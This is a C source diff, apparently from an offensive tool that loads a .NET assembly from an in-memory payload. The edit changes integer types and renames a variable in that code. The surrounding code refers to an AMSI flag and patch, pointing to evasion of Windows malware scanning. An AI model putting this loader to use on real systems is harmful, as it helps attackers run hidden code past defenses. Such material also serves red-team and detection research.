@@ -25,7 +25,7 @@ SIZE_T patchsize = 6;
 
 union PARAMSIZE {
 	unsigned char myByte[4];
-	long longvalue;
+	int intvalue;
 } paramsize;
 
 int executeSharp(LPVOID lpPayload)
@@ -64,11 +64,11 @@ int executeSharp(LPVOID lpPayload)
 	argssize.myByte[2] = pSize[6];
 	argssize.myByte[3] = pSize[7];
 
-	long raw_assembly_length = assemblysize.longvalue;
-	long RAW_AGRS_LENGTH = argssize.longvalue;
+	long raw_assembly_length = assemblysize.intvalue;
+	long raw_args_length = argssize.intvalue;
 
-	unsigned char *allData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char)+ RAW_AGRS_LENGTH * sizeof(unsigned char) + 8 * sizeof(unsigned char));
-	unsigned char *arg_s = (unsigned char*)malloc(RAW_AGRS_LENGTH * sizeof(unsigned char));
+	unsigned char *allData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char)+ raw_args_length * sizeof(unsigned char) + 8 * sizeof(unsigned char));
+	unsigned char *arg_s = (unsigned char*)malloc(raw_args_length * sizeof(unsigned char));
 	unsigned char *rawData = (unsigned char*)malloc(raw_assembly_length * sizeof(unsigned char));
 
 	rgsabound[0].cElements = raw_assembly_length;
@@ -85,7 +85,7 @@ int executeSharp(LPVOID lpPayload)
 	}
 	
 	//Reading memory parameters + amsiflag + args + assembly
-	ReadProcessMemory(GetCurrentProcess(), lpPayload , allData, raw_assembly_length + RAW_AGRS_LENGTH + 8, &readed);
+	ReadProcessMemory(GetCurrentProcess(), lpPayload , allData, raw_assembly_length + raw_args_length + 8, &readed);
 
 	//Taking pointer to amsi
 	unsigned char *offsetamsi = allData + 8;
@@ -98,7 +98,7 @@ int executeSharp(LPVOID lpPayload)
 	memcpy(arg_s, offsetargs, sizeof(arg_s));
 
 	//Taking pointer to assembly
-	unsigned char *offset = allData + RAW_AGRS_LENGTH + 9;
+	unsigned char *offset = allData + raw_args_length + 9;
 	//Store assembly
 	memcpy(pvData, offset, raw_assembly_length);
 
@@ -297,7 +297,7 @@ VOID Execute(LPVOID lpPayload)
 
 }
 
-BOOL FindVersion(void * assembly, long length)
+BOOL FindVersion(void * assembly, int length)
 {
 	char* assembly_c;
 	assembly_c = (char*)assembly;
